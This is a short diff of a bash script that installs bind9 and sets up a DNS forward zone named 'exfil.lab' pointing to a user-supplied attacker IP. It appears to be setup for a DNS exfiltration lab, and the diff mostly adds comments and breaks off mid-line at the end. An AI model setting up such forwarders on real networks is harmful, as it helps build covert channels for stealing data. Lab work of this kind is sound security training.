@@ -1,4 +1,5 @@
 #!/bin/bash
+
 if [ "$EUID" -ne 0 ]; then
     echo "[!] Please run this script with sudo"
     exit 1
@@ -10,6 +11,7 @@ read -p "Enter the IP address of the Attacker DNS Server: " ATTACKER_IP
 apt update
 apt install -y bind9
 
+# Configure forwarding zone
 tee /etc/bind/named.conf.local > /dev/null <<EOF
 zone "exfil.lab" {
     type forward;
@@ -17,6 +19,7 @@ zone "exfil.lab" {
 };
 EOF
 
+# Global options
 tee /etc/bind/named.conf.options > /dev/null <<EOF
 options {
     directory "/var/cache/bind";
@@ -30,4 +33,5 @@ options {
 EOF
 
 systemctl restart bind9
-echo "[+] DNS Forwarder ready. exfil.lab will forward to attacker at ${ATTACKER_IP}."
+
+echo "[+] DNS Forwarder ready. exfil.lab
